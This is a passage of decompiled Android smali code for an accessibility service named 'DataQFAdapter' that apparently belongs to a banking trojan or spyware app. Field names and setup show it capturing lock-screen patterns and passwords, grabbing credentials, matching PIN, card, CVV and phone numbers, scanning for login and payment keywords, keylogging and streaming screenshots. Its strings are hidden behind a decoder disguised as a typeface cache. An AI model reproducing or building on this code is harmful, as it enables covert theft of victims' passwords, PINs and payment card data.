    .line 1452
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1453
    .line 1454
    .line 1455
    move-result-object v4

    nop

    nop

    .line 1456
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1457
    .line 1458
    .line 1459
    move-result-object v5

    .line 1460
    const-string v0, "00200079005600C900FD00B600C700AE006D007D005E009E00F700AA00D300B50027"

    .line 1461
    .line 1462
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1463
    .line 1464
    .line 1465
    move-result-object v6

    .line 1466
    const-string v0, "00200079005600C900F300B000DE00A800310079004800C900FB00BA00CB00A00036007700490083"

    .line 1467
    .line 1468
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1469
    .line 1470
    .line 1471
    move-result-object v7

    .line 1472
    const-string v0, "00200079005600C900E400AD00D300A9003000650052008800FE00F100D300B70033007A0054008400FB"

    .line 1473
    .line 1474
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1475
    .line 1476
    .line 1477
    move-result-object v8

    .line 1478
    const-string v0, "00200079005600C900F400B000DF00A80021007F0057008200BE00BE00C200B7002F00790058008C"

    .line 1479
    .line 1480
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1481
    .line 1482
    .line 1483
    move-result-object v9

    .line 1484
    const-string v0, "00200079005600C900E300AF009C00B700310079004F008200F300AB00DD00B5006D00700049008200F5"

    .line 1485
    .line 1486
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1487
    .line 1488
    .line 1489
    move-result-object v10

    .line 1490
    const-string v0, "00200079005600C900E500AC00DA00A6003100730052009300BE00B300DD00A40028007F004F"

    .line 1491
    .line 1492
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1493
    .line 1494
    .line 1495
    move-result-object v11

    .line 1496
    const-string v0, "00200079005600C900FF00AF00C200A8006D007D005E009E00F700AA00D300B50027"

    .line 1497
    .line 1498
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1499
    .line 1500
    .line 1501
    move-result-object v12

    .line 1502
    const-string v0, "00200079005600C900FF00AF00DE00B2003000380050008200E900B800C700A600310072"

    .line 1503
    .line 1504
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1505
    .line 1506
    .line 1507
    move-result-object v13

    .line 1508
    filled-new-array/range {v3 .. v13}, [Ljava/lang/String;

    .line 1509
    .line 1510
    .line 1511
    move-result-object v0

    .line 1512
    invoke-static {v0}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 1513
    .line 1514
    .line 1515
    move-result-object v0

    .line 1516
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockScreenPackages:Ljava/util/Set;

    nop

    nop

    .line 1517
    .line 1518
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPattern:Ljava/lang/String;

    .line 1519
    .line 1520
    sput-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->capturedPassword:Ljava/lang/String;

    .line 1521
    .line 1522
    new-instance v0, Ljava/lang/StringBuilder;

    .line 1523
    .line 1524
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 1525
    .line 1526
    .line 1527
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockPasswordBuffer:Ljava/lang/StringBuilder;

    .line 1528
    .line 1529
    invoke-static {}, Ljava/util/concurrent/ConcurrentHashMap;->newKeySet()Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 1530
    .line 1531
    .line 1532
    move-result-object v0

    .line 1533
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 1534
    .line 1535
    const-string v0, "002C0064005C00C900E400BA00DE00A200240064005A008A00BE"

    .line 1536
    .line 1537
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1538
    .line 1539
    .line 1540
    move-result-object v1

    nop

    .line 1541
    const-string v0, "00200079005600C900E700B700D300B300300077004B0097"

    .line 1542
    .line 1543
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1544
    .line 1545
    .line 1546
    move-result-object v2

    .line 1547
    const-string v0, "00200079005600C900E600B600D000A200310038"

    .line 1548
    .line 1549
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1550
    .line 1551
    .line 1552
    move-result-object v3

    .line 1553
    const-string v0, "002C0064005C00C900E400B700DD00B20024007E004F008400E200B600DF00A2006D"

    .line 1554
    .line 1555
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1556
    .line 1557
    .line 1558
    move-result-object v4

    nop

    nop

    .line 1559
    const-string v0, "00200079005600C900F400B600C100A4002C0064005F"

    nop

    nop

    .line 1560
    .line 1561
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1562
    .line 1563
    .line 1564
    move-result-object v5

    nop

    .line 1565
    const-string v0, "00200079005600C900E300B400CB00B700260038"

    .line 1566
    .line 1567
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1568
    .line 1569
    .line 1570
    move-result-object v6

    .line 1571
    const-string v0, "002C0064005C00C900E400B700C700A9002700730049008300FF00B8009C"

    .line 1572
    .line 1573
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1574
    .line 1575
    .line 1576
    move-result-object v7

    .line 1577
    const-string v0, "002D00730050008800E800F1"

    .line 1578
    .line 1579
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1580
    .line 1581
    .line 1582
    move-result-object v8

    nop

    nop

    .line 1583
    const-string v0, "00200079005600C900E600B400DD00A9003700770050009300F500F1"

    .line 1584
    .line 1585
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1586
    .line 1587
    .line 1588
    move-result-object v9

    .line 1589
    const-string v0, "00200079005600C900F900B100C100B3002200710049008600FD00F1"

    .line 1590
    .line 1591
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1592
    .line 1593
    .line 1594
    move-result-object v10

    .line 1595
    const-string v0, "00200079005600C900F600BE00D100A2002100790054008C00BE"

    .line 1596
    .line 1597
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1598
    .line 1599
    .line 1600
    move-result-object v11

    .line 1601
    const-string v0, "00200079005600C900EA00B700DB00AB002A00770054008600E000AF009C"

    .line 1602
    .line 1603
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1604
    .line 1605
    .line 1606
    move-result-object v12

    .line 1607
    const-string v0, "00200079005600C900E400A800DB00B300370073004900C9"

    .line 1608
    .line 1609
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1610
    .line 1611
    .line 1612
    move-result-object v13

    .line 1613
    const-string v0, "00200079005600C900E300B100D300B70020007E005A009300BE"

    .line 1614
    .line 1615
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1616
    .line 1617
    .line 1618
    move-result-object v14

    .line 1619
    const-string v0, "00200079005600C900FC00B600DC00AC002600720052008900BE"

    .line 1620
    .line 1621
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1622
    .line 1623
    .line 1624
    move-result-object v15

    .line 1625
    const-string v0, "00200079005600C900E200BA00D600A3002A00620015"

    .line 1626
    .line 1627
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1628
    .line 1629
    .line 1630
    move-result-object v16

    .line 1631
    const-string v0, "002E00730015009300F800AD00D700A2002E00770015"

    .line 1632
    .line 1633
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1634
    .line 1635
    .line 1636
    move-result-object v17

    nop

    nop

    .line 1637
    const-string v0, "00200079005600C900F700B000DD00A0002F00730015008600FE00BB00C000A8002A00720015008000FD"

    .line 1638
    .line 1639
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1640
    .line 1641
    .line 1642
    move-result-object v18

    .line 1643
    const-string v0, "003100630015008A00F100B600DE00E9"

    .line 1644
    .line 1645
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1646
    .line 1647
    .line 1648
    move-result-object v19

    .line 1649
    const-string v0, "003100630015009E00F100B100D600A2003B00380056008600F900B3"

    .line 1650
    .line 1651
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1652
    .line 1653
    .line 1654
    move-result-object v20

    .line 1655
    const-string v0, "00200079005600C900FD00B600D100B5002C00650054008100E400F100DD00A10025007F0058008200BE00B000C700B3002F00790054008C"

    .line 1656
    .line 1657
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1658
    .line 1659
    .line 1660
    move-result-object v21

    .line 1661
    const-string v0, "00200079005600C900E900BE00DA00A8002C00380056008800F200B600DE00A2006D"

    .line 1662
    .line 1663
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1664
    .line 1665
    .line 1666
    move-result-object v22

    .line 1667
    filled-new-array/range {v1 .. v22}, [Ljava/lang/String;

    .line 1668
    .line 1669
    .line 1670
    move-result-object v0

    .line 1671
    invoke-static {v0}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 1672
    .line 1673
    .line 1674
    move-result-object v0

    .line 1675
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->noPinOverlayPrefixes:Ljava/util/Set;

    .line 1676
    .line 1677
    new-instance v0, Ljava/util/concurrent/ConcurrentHashMap;

    .line 1678
    .line 1679
    invoke-direct {v0}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    .line 1680
    .line 1681
    .line 1682
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->capturedCreds:Ljava/util/concurrent/ConcurrentHashMap;

    .line 1683
    .line 1684
    new-instance v0, Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1685
    .line 1686
    const-string v1, "001D004A005F009C00A400F3008A00BA0067"

    .line 1687
    .line 1688
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1689
    .line 1690
    .line 1691
    move-result-object v1

    .line 1692
    invoke-direct {v0, v1}, Lv/s/NB5LVitKoIkG7GAQ6;-><init>(Ljava/lang/String;)V

    .line 1693
    .line 1694
    .line 1695
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_PIN:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1696
    .line 1697
    new-instance v0, Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1698
    .line 1699
    const-string v1, "001D004A005F009C00A100EC009E00F6007A006B001F"

    .line 1700
    .line 1701
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1702
    .line 1703
    .line 1704
    move-result-object v1

    .line 1705
    invoke-direct {v0, v1}, Lv/s/NB5LVitKoIkG7GAQ6;-><init>(Ljava/lang/String;)V

    .line 1706
    .line 1707
    .line 1708
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_CARD:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1709
    .line 1710
    new-instance v0, Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1711
    .line 1712
    const-string v1, "001D004A005F009C00A300F3008600BA0067"

    nop

    .line 1713
    .line 1714
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1715
    .line 1716
    .line 1717
    move-result-object v1

    .line 1718
    invoke-direct {v0, v1}, Lv/s/NB5LVitKoIkG7GAQ6;-><init>(Ljava/lang/String;)V

    .line 1719
    .line 1720
    .line 1721
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_CVV:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1722
    .line 1723
    new-instance v0, Lv/s/NB5LVitKoIkG7GAQ6;

    nop

    .line 1724
    .line 1725
    const-string v1, "001D004A001000D800CC00BB00C900F60073003A000A00D200ED00FB"

    .line 1726
    .line 1727
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1728
    .line 1729
    .line 1730
    move-result-object v1

    .line 1731
    invoke-direct {v0, v1}, Lv/s/NB5LVitKoIkG7GAQ6;-><init>(Ljava/lang/String;)V

    .line 1732
    .line 1733
    .line 1734
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->RE_PHONE:Lv/s/NB5LVitKoIkG7GAQ6;

    .line 1735
    .line 1736
    const-string v0, "003300770048009400E700B000C000A3"

    .line 1737
    .line 1738
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1739
    .line 1740
    .line 1741
    move-result-object v1

    .line 1742
    const-string v0, "047C0426047B04D904AB0493"

    .line 1743
    .line 1744
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1745
    .line 1746
    .line 1747
    move-result-object v2

    .line 1748
    const-string v0, "0033007F0055"

    nop

    .line 1749
    .line 1750
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1751
    .line 1752
    .line 1753
    move-result-object v3

    .line 1754
    const-string v0, "047C042E0406"

    .line 1755
    .line 1756
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1757
    .line 1758
    .line 1759
    move-result-object v4

    .line 1760
    const-string v0, "04790428040F"

    .line 1761
    .line 1762
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1763
    .line 1764
    .line 1765
    move-result-object v5

    .line 1766
    const-string v0, "00200079005F0082"

    nop

    nop

    .line 1767
    .line 1768
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1769
    .line 1770
    .line 1771
    move-result-object v6

    .line 1772
    const-string v0, "003000730058009500F500AB"

    .line 1773
    .line 1774
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1775
    .line 1776
    .line 1777
    move-result-object v7

    .line 1778
    const-string v0, "04020423040104A704A5049D"

    .line 1779
    .line 1780
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1781
    .line 1782
    .line 1783
    move-result-object v8

    .line 1784
    const-string v0, "003300770048009400F300B000D600A2"

    nop

    nop

    .line 1785
    .line 1786
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1787
    .line 1788
    .line 1789
    move-result-object v9

    .line 1790
    const-string v0, "003300770048009400E000B700C000A600300073"

    .line 1791
    .line 1792
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1793
    .line 1794
    .line 1795
    move-result-object v10

    .line 1796
    const-string v0, "003000730058009200E200B600C600BE"

    nop

    .line 1797
    .line 1798
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1799
    .line 1800
    .line 1801
    move-result-object v11

    nop

    nop

    .line 1802
    filled-new-array/range {v1 .. v11}, [Ljava/lang/String;

    .line 1803
    .line 1804
    .line 1805
    move-result-object v0

    .line 1806
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_PASSWORD:[Ljava/lang/String;

    .line 1807
    .line 1808
    const-string v0, "0020007700490083"

    .line 1809
    .line 1810
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1811
    .line 1812
    .line 1813
    move-result-object v0

    .line 1814
    const-string v1, "04790426047B04A504A0"

    .line 1815
    .line 1816
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1817
    .line 1818
    .line 1819
    move-result-object v1

    .line 1820
    const-string v2, "047E0428040704D204D000FF048804F7040304540470"

    .line 1821
    .line 1822
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1823
    .line 1824
    .line 1825
    move-result-object v2

    .line 1826
    const-string v3, "002000770049008300B000B100C700AA002100730049"

    .line 1827
    .line 1828
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1829
    .line 1830
    .line 1831
    move-result-object v3

    .line 1832
    const-string v4, "003300770055"

    .line 1833
    .line 1834
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1835
    .line 1836
    .line 1837
    move-result-object v4

    .line 1838
    filled-new-array {v0, v1, v2, v3, v4}, [Ljava/lang/String;

    .line 1839
    .line 1840
    .line 1841
    move-result-object v0

    .line 1842
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_CARD:[Ljava/lang/String;

    .line 1843
    .line 1844
    const-string v0, "00200060004D"

    .line 1845
    .line 1846
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1847
    .line 1848
    .line 1849
    move-result-object v0

    .line 1850
    const-string v1, "002000600058"

    .line 1851
    .line 1852
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1853
    .line 1854
    .line 1855
    move-result-object v1

    .line 1856
    const-string v2, "002000600009"

    .line 1857
    .line 1858
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1859
    .line 1860
    .line 1861
    move-result-object v2

    .line 1862
    const-string v3, "003000730058009200E200B600C600BE006300750054008300F5"

    .line 1863
    .line 1864
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1865
    .line 1866
    .line 1867
    move-result-object v3

    nop

    nop

    .line 1868
    const-string v4, "04790428040F00C704A104EA048504F9047C0426047A04DA04AE049E04F004FF"

    .line 1869
    .line 1870
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1871
    .line 1872
    .line 1873
    move-result-object v4

    .line 1874
    filled-new-array {v0, v1, v2, v3, v4}, [Ljava/lang/String;

    .line 1875
    .line 1876
    .line 1877
    move-result-object v0

    .line 1878
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_CVV:[Ljava/lang/String;

    .line 1879
    .line 1880
    const-string v0, "002F0079005C008E00FE"

    .line 1881
    .line 1882
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1883
    .line 1884
    .line 1885
    move-result-object v1

    .line 1886
    const-string v0, "04780428040804DF04AD"

    .line 1887
    .line 1888
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1889
    .line 1890
    .line 1891
    move-result-object v2

    .line 1892
    const-string v0, "00360065005E009500FE00BE00DF00A2"

    .line 1893
    .line 1894
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1895
    .line 1896
    .line 1897
    move-result-object v3

    .line 1898
    const-string v0, "0026007B005A008E00FC"

    .line 1899
    .line 1900
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1901
    .line 1902
    .line 1903
    move-result-object v4

    .line 1904
    const-string v0, "0033007E0054008900F5"

    .line 1905
    .line 1906
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1907
    .line 1908
    .line 1909
    move-result-object v5

    .line 1910
    const-string v0, "04010423040004D204D404E1048F"

    .line 1911
    .line 1912
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1913
    .line 1914
    .line 1915
    move-result-object v6

    .line 1916
    const-string v0, "047C0428047C04A504A0"

    .line 1917
    .line 1918
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 1919
    .line 1920
    .line 1921
    move-result-object v7

    .line 1922
    const-string v0, "0026003B0056008600F900B3"

    .line 1923
    .line 1924
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1925
    .line 1926
    .line 1927
    move-result-object v8

    .line 1928
    filled-new-array/range {v1 .. v8}, [Ljava/lang/String;

    .line 1929
    .line 1930
    .line 1931
    move-result-object v0

    .line 1932
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->KW_LOGIN:[Ljava/lang/String;

    .line 1933
    .line 1934
    new-instance v0, Ljava/util/concurrent/atomic/AtomicReference;

    .line 1935
    .line 1936
    const/4 v1, 0x0

    .line 1937
    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicReference;-><init>(Ljava/lang/Object;)V

    .line 1938
    .line 1939
    .line 1940
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->latestFrame:Ljava/util/concurrent/atomic/AtomicReference;

    .line 1941
    .line 1942
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    .line 1943
    .line 1944
    .line 1945
    move-result-object v0

    .line 1946
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->screenshotExecutor:Ljava/util/concurrent/ExecutorService;

    .line 1947
    .line 1948
    const/16 v0, 0x32

    .line 1949
    .line 1950
    sput v0, Lapp/mobilex/plus/services/DataQFAdapter;->streamQuality:I

    .line 1951
    .line 1952
    const/16 v0, 0x168

    .line 1953
    .line 1954
    sput v0, Lapp/mobilex/plus/services/DataQFAdapter;->streamWidth:I

    nop

    .line 1955
    .line 1956
    new-instance v0, Ljava/util/ArrayList;

    .line 1957
    .line 1958
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 1959
    .line 1960
    .line 1961
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogEntries:Ljava/util/List;

    nop

    .line 1962
    .line 1963
    new-instance v0, Ljava/util/concurrent/ConcurrentHashMap;

    .line 1964
    .line 1965
    invoke-direct {v0}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    .line 1966
    .line 1967
    .line 1968
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->appNameCache:Ljava/util/concurrent/ConcurrentHashMap;

    .line 1969
    .line 1970
    new-instance v0, Ljava/util/ArrayList;

    .line 1971
    .line 1972
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 1973
    .line 1974
    .line 1975
    sput-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingBatch:Ljava/util/List;

    .line 1976
    .line 1977
    return-void
.end method

.method public constructor <init>()V
    .locals 30

    .line 1
    move-object/from16 v0, p0

    .line 2
    .line 3
    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    .line 4
    .line 5
    .line 6
    new-instance v1, Landroid/os/Handler;

    .line 7
    .line 8
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 9
    .line 10
    .line 11
    move-result-object v2

    .line 12
    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 13
    .line 14
    .line 15
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 16
    .line 17
    const-string v1, ""

    .line 18
    .line 19
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->lastText:Ljava/lang/String;

    .line 20
    .line 21
    new-instance v2, Ljava/util/HashMap;

    .line 22
    .line 23
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 24
    .line 25
    .line 26
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 27
    .line 28
    new-instance v2, Ljava/util/HashMap;

    nop

    .line 29
    .line 30
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 31
    .line 32
    .line 33
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTimeCache:Ljava/util/HashMap;

    .line 34
    .line 35
    new-instance v2, Ljava/util/HashMap;

    nop

    nop

    .line 36
    .line 37
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 38
    .line 39
    .line 40
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 41
    .line 42
    new-instance v2, Ljava/util/HashMap;

    .line 43
    .line 44
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 45
    .line 46
    .line 47
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 48
    .line 49
    new-instance v2, Ljava/util/HashMap;

    .line 50
    .line 51
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 52
    .line 53
    .line 54
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 55
    .line 56
    const-wide/16 v2, 0xbb8

    .line 57
    .line 58
    iput-wide v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->PASSWORD_GRABBER_DELAY_MS:J

    .line 59
    .line 60
    new-instance v2, Landroid/os/Handler;

    .line 61
    .line 62
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 63
    .line 64
    .line 65
    move-result-object v3

    .line 66
    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 67
    .line 68
    .line 69
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 70
    .line 71
    new-instance v2, Ljava/util/HashMap;

    .line 72
    .line 73
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 74
    .line 75
    .line 76
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogEntries:Ljava/util/HashMap;

    .line 77
    .line 78
    new-instance v2, Ljava/util/HashMap;

    .line 79
    .line 80
    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    .line 81
    .line 82
    .line 83
    iput-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingKeylogRunnables:Ljava/util/HashMap;

    .line 84
    .line 85
    const-wide/16 v2, 0x12c

    .line 86
    .line 87
    iput-wide v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->KEYLOG_DEBOUNCE_MS:J

    .line 88
    .line 89
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 90
    .line 91
    iput-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 92
    .line 93
    new-instance v2, Landroid/os/Handler;

    .line 94
    .line 95
